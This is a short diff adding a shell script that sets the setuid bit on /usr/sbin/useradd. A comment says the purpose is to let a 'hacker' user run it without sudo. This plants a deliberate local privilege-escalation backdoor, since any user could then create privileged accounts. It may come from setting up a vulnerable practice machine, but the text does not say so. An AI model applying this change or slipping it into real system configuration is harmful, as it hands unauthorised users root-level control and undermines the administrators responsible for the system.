@@ -1,0 +1,4 @@
+#!/bin/sh
+
+# Allow hacker user to run useradd without sudo
+chmod 4755 /usr/sbin/useradd
